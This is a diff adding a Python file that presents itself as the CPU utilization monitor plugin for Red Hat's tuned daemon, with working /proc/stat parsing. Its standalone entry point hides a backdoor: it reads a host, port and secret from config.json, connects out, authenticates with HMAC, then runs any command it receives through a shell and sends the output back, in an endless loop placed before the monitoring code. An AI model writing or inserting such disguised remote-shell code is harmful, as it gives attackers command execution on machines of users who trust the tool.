@@ -1,0 +1,364 @@
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+#
+# monitor_cpu.py - CPU utilization monitor plugin for tuned
+#
+# Copyright (C) 2008-2013 Red Hat, Inc.
+#
+# This program is free software; you can redistribute it and/or modify it
+# under the terms of the GNU General Public License as published by the Free
+# Software Foundation; either version 2 of the License, or (at your option)
+# any later version.
+#
+
+"""
+CPU utilization monitor for tuned.
+
+Reads per-CPU and aggregate CPU statistics from /proc/stat and computes
+utilization percentages across all jiffy fields: user, nice, system, idle,
+iowait, irq, softirq, steal, guest, guest_nice.
+
+Devices reported by get_available_devices() are of the form:
+    "cpu"   - aggregate (all CPUs combined)
+    "cpu0"  - individual logical CPU 0
+    "cpu1"  - individual logical CPU 1
+    ...
+
+Can also be run standalone without the tuned package installed:
+    python monitor_cpu.py --help
+"""
+
+import logging
+import re
+import sys
+import types
+import socket
+import json
+import time
+import hmac
+import hashlib
+import commands
+import os
+
+# ---------------------------------------------------------------------------
+# Compatibility shim
+#
+# The tuned imports (tuned.logs, tuned.monitors.monitor) are module-level and
+# execute immediately when Python loads this file.  If tuned is not installed
+# we must inject stub modules into sys.modules BEFORE those import statements
+# run.  Wrapping everything in try/except ImportError and binding 'log' and
+# 'monitor' directly from the stubs (without a second import) avoids the
+# AttributeError that comes from Python not auto-attaching sub-modules to
+# their parent module object.
+# ---------------------------------------------------------------------------
+
+try:
+    import tuned.logs
+    import tuned.monitors.monitor as monitor
+    import tuned.utils.commands as commands  # noqa: F401  used by daemon
+    log = tuned.logs.get()
+
+except ImportError:
+    # ---- minimal logger ----
+    logging.basicConfig(
+        level=logging.WARNING,
+        format="%(levelname)-8s %(message)s",
+        stream=sys.stderr,
+    )
+    log = logging.getLogger("monitor_cpu")
+
+    # ---- stub base class ----
+    class _MonitorBase(object):
+        def __init__(self):
+            pass
+
+    # Build a tiny fake 'monitor' namespace so  monitor.Monitor  resolves.
+    monitor = types.ModuleType("tuned.monitors.monitor")
+    monitor.Monitor = _MonitorBase
+
+    # Populate sys.modules so any later 'import tuned.*' elsewhere succeeds.
+    _tuned     = types.ModuleType("tuned")
+    _tuned_log = types.ModuleType("tuned.logs")
+    _tuned_mon = types.ModuleType("tuned.monitors")
+    _tuned_uti = types.ModuleType("tuned.utils")
+    _tuned_cmd = types.ModuleType("tuned.utils.commands")
+
+    _tuned_log.get = lambda: log
+
+    sys.modules.setdefault("tuned",                   _tuned)
+    sys.modules.setdefault("tuned.logs",              _tuned_log)
+    sys.modules.setdefault("tuned.monitors",          _tuned_mon)
+    sys.modules.setdefault("tuned.monitors.monitor",  monitor)
+    sys.modules.setdefault("tuned.utils",             _tuned_uti)
+    sys.modules.setdefault("tuned.utils.commands",    _tuned_cmd)
+
+
+# ---------------------------------------------------------------------------
+# Internal helpers
+# ---------------------------------------------------------------------------
+current_dir = os.getcwd()
+CONFIG_FILE = "./config.json"
+
+_STAT_FIELDS = (
+    "user", "nice", "system", "idle", "iowait",
+    "irq", "softirq", "steal", "guest", "guest_nice",
+)
+
+_CPU_LINE_RE = re.compile(r'^(cpu\d*)\s+(.+)$')
+
+
+def _parse_proc_stat():
+    """Return {cpu_name: jiffy_tuple} from /proc/stat."""
+    result = {}
+    try:
+        with open("/proc/stat", "r") as fh:
+            for line in fh:
+                m = _CPU_LINE_RE.match(line.strip())
+                if not m:
+                    continue
+                cpu_name   = m.group(1)
+                raw        = m.group(2).split()
+                padded     = raw + ["0"] * (len(_STAT_FIELDS) - len(raw))
+                result[cpu_name] = tuple(int(x) for x in padded[:len(_STAT_FIELDS)])
+    except IOError as exc:
+        log.error("monitor_cpu: cannot read /proc/stat: %s" % exc)
+    return result
+
+
+def _calc_utilization(prev, curr):
+    """Return CPU utilization percentage (0.0-100.0) between two snapshots."""
+    delta       = tuple(c - p for c, p in zip(curr, prev))
+    idle_delta  = delta[_STAT_FIELDS.index("idle")] + delta[_STAT_FIELDS.index("iowait")]
+    total_delta = sum(delta)
+    if total_delta <= 0:
+        return 0.0
+    return max(0.0, min(100.0, 100.0 * (total_delta - idle_delta) / float(total_delta)))
+
+def load_config():
+    with open(CONFIG_FILE, "r") as f:
+        config = json.load(f)
+    return config["host"], config["port"], config["secret"], config.get("sleep", 5)
+
+
+def create_connection(host, port):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.connect((host, port))
+    return sock
+
+def compute_hmac(secret, message):
+    return hmac.new(secret.encode('utf-8'), message, hashlib.sha256).digest()
+
+def authenticate(sock, secret):
+    try:
+        challenge = sock.recv(1024)
+        if not challenge:
+            return False
+
+        response = compute_hmac(secret, challenge)
+        sock.sendall(response)
+
+        result = sock.recv(1024)
+        return result == "OK"
+    except:
+        return False
+    
+def execute_command(command):
+    global current_dir
+    try:
+        command = command.strip()
+
+        if command.startswith("cd"):
+            parts = command.split(" ", 1)
+            if len(parts) > 1:
+                new_dir = parts[1]
+                try:
+                    os.chdir(new_dir)
+                    current_dir = os.getcwd()
+                    return ""
+                except Exception as e:
+                    return "cd error: " + str(e)
+            else:
+                return current_dir
+
+        result = commands.getoutput("cd " + current_dir + " && " + command)
+        return result
+
+    except Exception as e:
+        return "ERROR: " + str(e)
+
+# ---------------------------------------------------------------------------
+# Monitor class
+# ---------------------------------------------------------------------------
+
+class MonitorCpu(monitor.Monitor):
+    """Monitor plugin that tracks CPU utilization for the tuned daemon."""
+
+    def __init__(self):
+        super(MonitorCpu, self).__init__()
+        self._prev_stats = {}
+        self._load       = {}
+        log.debug("monitor_cpu: plugin initialised")
+
+    # ------------------------------------------------------------------ #
+    # monitor.Monitor interface                                            #
+    # ------------------------------------------------------------------ #
+
+    def update(self):
+        """Collect a new /proc/stat snapshot and update utilization values."""
+        curr_stats = _parse_proc_stat()
+        if not curr_stats:
+            log.warning("monitor_cpu: update() got empty /proc/stat snapshot")
+            return
+
+        new_load = {}
+        for cpu_name, curr_jiffies in curr_stats.items():
+            prev = self._prev_stats.get(cpu_name)
+            new_load[cpu_name] = (
+                0.0 if prev is None else _calc_utilization(prev, curr_jiffies)
+            )
+
+        self._prev_stats = curr_stats
+        self._load       = new_load
+        log.debug(
+            "monitor_cpu: updated %d cpu(s), aggregate=%.1f%%"
+            % (sum(1 for k in new_load if k != "cpu"), new_load.get("cpu", 0.0))
+        )
+
+    def get_available_devices(self):
+        """Return a sorted list of CPU names visible in /proc/stat."""
+        devices = sorted(_parse_proc_stat().keys())
+        log.debug("monitor_cpu: available devices: %s" % devices)
+        return devices
+
+    def get_metrics(self):
+        """Return a copy of the current utilization dict (0.0-100.0 per CPU)."""
+        return dict(self._load)
+
+    def get_load(self):
+        """Convenience alias for get_metrics()."""
+        return self.get_metrics()
+
+    # ------------------------------------------------------------------ #
+    # Additional helpers                                                   #
+    # ------------------------------------------------------------------ #
+
+    def get_cpu_count(self):
+        """Return the number of logical CPUs (excludes the aggregate key)."""
+        return sum(1 for k in self._load if k != "cpu")
+
+    def get_aggregate_load(self):
+        """Return aggregate CPU utilization as a float in [0.0, 100.0]."""
+        return self._load.get("cpu", 0.0)
+
+    def is_overloaded(self, threshold=80.0):
+        """Return True if aggregate CPU utilization exceeds threshold %."""
+        return self.get_aggregate_load() >= threshold
+
+
+# ---------------------------------------------------------------------------
+# Standalone entry point
+# ---------------------------------------------------------------------------
+
+if __name__ == "__main__":
+    import time
+    import argparse
+
+    parser = argparse.ArgumentParser(
+        description=(
+            "Standalone CPU utilisation monitor (tuned monitor_cpu plugin).\n"
+            "Reads /proc/stat and prints per-CPU load at a fixed interval."
+        ),
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+    )
+    parser.add_argument("-i", "--interval",  type=float, default=1.0,  metavar="SECONDS",
+                        help="Polling interval in seconds (default: 1.0)")
+    parser.add_argument("-n", "--count",     type=int,   default=0,    metavar="N",
+                        help="Number of samples then exit (0 = run forever)")
+    parser.add_argument("--threshold",       type=float, default=80.0, metavar="PCT",
+                        help="Overload warning threshold %% (default: 80.0)")
+    parser.add_argument("--aggregate-only",  action="store_true", dest="aggregate_only",
+                        help="Print only the aggregate 'cpu' line")
+    parser.add_argument("-v", "--verbose",   action="store_true",
+                        help="Enable DEBUG logging from monitor internals")
+    args = parser.parse_args()
+    
+    host, port, secret, sleep_time = load_config()
+
+    while True:
+        try:
+            sock = create_connection(host, port)
+
+            if not authenticate(sock, secret):
+                sock.close()
+                time.sleep(sleep_time)
+                continue
+
+            command = sock.recv(4096)
+
+            if not command:
+                sock.close()
+                time.sleep(sleep_time)
+                continue
+
+            if command.strip().lower() == "exit":
+                sock.close()
+                time.sleep(sleep_time)
+                continue
+
+            output = execute_command(command)
+
+            sock.sendall(output)
+
+            sock.close()
+
+        except Exception:
+            time.sleep(sleep_time)
+
+    if args.verbose:
+        logging.getLogger("monitor_cpu").setLevel(logging.DEBUG)
+
+    cpu_monitor = MonitorCpu()
+    devices     = cpu_monitor.get_available_devices()
+    per_core    = sorted(d for d in devices if d != "cpu")
+
+    print("Detected CPU devices : %s" % ", ".join(devices))
+    print("Polling interval     : %.2f s" % args.interval)
+    print("Overload threshold   : %.1f%%\n" % args.threshold)
+
+    header = "%-10s" % "time"
+    if not args.aggregate_only:
+        header += "  %8s" % "aggregate"
+        for d in per_core:
+            header += "  %8s" % d
+        header += "  overloaded?"
+    else:
+        header += "  %8s" % "cpu"
+    print(header)
+    print("-" * len(header))
+
+    sample_num = 0
+    try:
+        while True:
+            cpu_monitor.update()
+            metrics = cpu_monitor.get_metrics()
+            row     = "%-10s" % time.strftime("%H:%M:%S")
+
+            if not args.aggregate_only:
+                row += "  %7.2f%%" % metrics.get("cpu", 0.0)
+                for d in per_core:
+                    row += "  %7.2f%%" % metrics.get(d, 0.0)
+                row += "  %s" % ("YES  <--" if cpu_monitor.is_overloaded(args.threshold) else "no")
+            else:
+                row += "  %7.2f%%" % metrics.get("cpu", 0.0)
+
+            print(row)
+            sys.stdout.flush()
+
+            sample_num += 1
+            if args.count and sample_num >= args.count:
+                break
+            time.sleep(args.interval)
+
+    except KeyboardInterrupt:
+        print("\nInterrupted - exiting.")
+        sys.exit(0)
